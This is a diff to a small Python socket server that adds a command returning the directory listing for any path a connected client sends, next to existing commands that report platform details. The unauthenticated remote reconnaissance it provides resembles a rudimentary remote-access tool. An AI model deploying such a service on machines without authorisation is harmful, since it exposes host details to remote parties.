@@ -25,6 +25,19 @@ def main():
                 if data.decode('utf-8').strip() == '1':
                     snd_data = platform.platform() + " " + platform.machine()  
                     conn.sendall(snd_data.encode())  
+                elif data.decode('utf-8').strip() == '2':
+                    req = "enter path"
+                    conn.sendall(req.encode())
+                    data = conn.recv(1024)
+                    try:
+                        filelist = os.listdir(data.decode('utf-8').strip())
+                        f_pkg = ""
+                        for x in filelist:
+                            f_pkg += x + "\n\r"
+                    except:
+                        f_pkg = "WRONG PATH"
+                    conn.sendall(f_pkg.encode())
+
                 elif data.decode('utf-8').strip() == '0':
                     conn.close()
                     exit()
